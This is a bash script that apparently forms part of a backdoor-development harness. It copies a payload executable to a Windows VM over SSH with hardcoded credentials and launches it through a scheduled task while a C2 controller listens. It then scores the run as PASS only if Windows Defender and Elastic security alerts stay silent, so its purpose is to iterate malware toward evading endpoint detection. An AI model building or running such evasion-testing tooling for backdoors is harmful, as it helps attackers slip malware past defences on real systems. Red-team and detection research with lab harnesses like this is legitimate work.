#!/bin/bash
# Deploy and test a backdoor payload on the Windows VM.
# Usage: deploy_backdoor.sh [payload.exe] [--c2-port PORT]

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

VM_PORT=${VM_PORT:-10022}
VM_USER=${VM_USER:-vmuser}
VM_PASS=${VM_PASS:-vmuser123}
C2_PORT=${C2_PORT:-9001}
TIMEOUT=${TIMEOUT:-120}
PAYLOAD="${1:-$PROJECT_DIR/results/latest/payload.exe}"
TASK_NAME="backdoor_test"

ssh_cmd() {
    sshpass -p "$VM_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p "$VM_PORT" "$VM_USER@localhost" "$@"
}
scp_cmd() {
    sshpass -p "$VM_PASS" scp -o StrictHostKeyChecking=no -P "$VM_PORT" "$@"
}

# Parse extra args
shift 2>/dev/null || true
while [[ $# -gt 0 ]]; do
    case "$1" in
        --c2-port) C2_PORT="$2"; shift 2 ;;
        --timeout) TIMEOUT="$2"; shift 2 ;;
        *) shift ;;
    esac
done

cleanup() {
    echo ""
    echo "[*] Cleaning up VM..."
    ssh_cmd "taskkill /f /im payload.exe 2>nul & del /f C:\\Users\\$VM_USER\\Desktop\\payload.exe 2>nul & schtasks /delete /tn $TASK_NAME /f 2>nul" 2>/dev/null || true
    fuser -k $C2_PORT/tcp 2>/dev/null || true
    echo "[*] Cleanup done"
}
trap cleanup EXIT

echo ""
echo "============================================"
echo "  BACKDOOR DEPLOY & TEST"
echo "============================================"
echo "  Payload:  $PAYLOAD"
echo "  C2 Port:  $C2_PORT"
echo "  Timeout:  ${TIMEOUT}s"
echo "============================================"
echo ""

# Check payload exists
if [ ! -f "$PAYLOAD" ]; then
    echo "[!] Payload not found: $PAYLOAD"
    exit 1
fi

# Step 1: Check VM alive
echo "[1/6] Checking VM connectivity..."
if ! ssh_cmd "echo VM_ALIVE" 2>/dev/null | tr -d '\r' | grep -q "VM_ALIVE"; then
    echo "[!] VM not reachable on port $VM_PORT"
    exit 1
fi
echo "  OK"

# Step 2: Upload payload
echo "[2/6] Uploading payload..."
scp_cmd "$PAYLOAD" "$VM_USER@localhost:C:\\Users\\$VM_USER\\Desktop\\payload.exe" 2>/dev/null
echo "  OK — uploaded $(stat -c%s "$PAYLOAD") bytes"

# Step 3: Check Defender quarantine
echo "[3/6] Checking Defender quarantine (2s wait)..."
sleep 2
EXISTS=$(ssh_cmd 'if exist C:\Users\vmuser\Desktop\payload.exe (echo EXISTS) else (echo GONE)' 2>/dev/null | tr -d '\r')
if echo "$EXISTS" | grep -q "GONE"; then
    echo "  QUARANTINED — Defender caught the payload"
    echo ""
    echo "  Detection info:"
    ssh_cmd 'powershell -Command "Get-MpThreatDetection | Select-Object -Last 1 | Format-List"' 2>/dev/null | sed 's/^/    /'
    echo ""
    echo "RESULT: EVASION FAIL (static detection)"
    exit 2
fi
echo "  OK — binary survived Defender"

# Step 4: Start C2 controller in test mode
echo "[4/6] Starting C2 controller (test-sequence mode)..."
fuser -k $C2_PORT/tcp 2>/dev/null || true
sleep 1
python3 -u "$SCRIPT_DIR/c2_backdoor.py" --port $C2_PORT --test-sequence --timeout $TIMEOUT &
C2_PID=$!
sleep 2

if ! kill -0 $C2_PID 2>/dev/null; then
    echo "  [!] C2 controller failed to start"
    exit 1
fi
echo "  OK — PID $C2_PID listening on :$C2_PORT"

# Step 5: Execute payload on VM
echo "[5/6] Executing payload on VM..."
ssh_cmd "schtasks /create /tn $TASK_NAME /tr C:\\Users\\$VM_USER\\Desktop\\payload.exe /sc once /st 00:00 /f >nul 2>&1 && schtasks /run /tn $TASK_NAME >nul 2>&1" 2>/dev/null
echo "  OK — payload launched via schtasks"

# Step 6: Wait for C2 test results
echo "[6/6] Waiting for C2 test sequence (timeout: ${TIMEOUT}s)..."
echo ""

wait $C2_PID 2>/dev/null
C2_RC=$?

echo ""
echo "============================================"

# Check Defender post-execution
echo "[*] Checking Defender post-execution detections..."
DEFENDER_DETECTIONS=$(ssh_cmd 'powershell -Command "(Get-MpThreatDetection | Where-Object { $_.InitialDetectionTime -gt (Get-Date).AddMinutes(-5) }).Count"' 2>/dev/null | tr -d '\r' | grep -E '^[0-9]+$' || echo "0")

# Check Elastic alerts (filter out deploy-infrastructure noise: schtasks, tasklist, hostname, sshd)
echo "[*] Checking Elastic alerts (excluding deploy harness noise)..."
ELASTIC_ALERTS="0"
if command -v curl &>/dev/null; then
    ELASTIC_ALERTS=$(curl -sk -u elastic:changeme "https://localhost:9200/.alerts-security*/_search?size=100" 2>/dev/null | python3 -c "
import json, sys
DEPLOY_NOISE = {'schtasks.exe','tasklist.exe','HOSTNAME.EXE','hostname.exe','cmd.exe','sshd.exe','reg.exe'}
data = json.load(sys.stdin)
payload_alerts = 0
for h in data.get('hits',{}).get('hits',[]):
    s = h.get('_source',{})
    proc = s.get('process',{}).get('name','')
    parent = s.get('process',{}).get('parent',{}).get('name','')
    if proc in DEPLOY_NOISE or parent in ('sshd.exe','cmd.exe'):
        continue
    payload_alerts += 1
print(payload_alerts)
" 2>/dev/null || echo "0")
fi

echo ""
echo "============================================"
echo "  RESULTS"
echo "============================================"
echo "  C2 test:          $([ $C2_RC -eq 0 ] && echo 'PASS' || echo 'FAIL')"
echo "  Defender:         $DEFENDER_DETECTIONS detections"
echo "  Elastic alerts:   $ELASTIC_ALERTS"
echo "============================================"

if [ "$C2_RC" -eq 0 ] && [ "$DEFENDER_DETECTIONS" = "0" ] && [ "$ELASTIC_ALERTS" = "0" ]; then
    echo ""
    echo "  OVERALL: PASS"
    exit 0
else
    echo ""
    echo "  OVERALL: FAIL"
    [ "$C2_RC" -ne 0 ] && echo "    - C2 test sequence failed"
    [ "$DEFENDER_DETECTIONS" != "0" ] && echo "    - Defender detected ($DEFENDER_DETECTIONS threats)"
    [ "$ELASTIC_ALERTS" != "0" ] && echo "    - Elastic alerts fired ($ELASTIC_ALERTS)"
    exit 1
fi
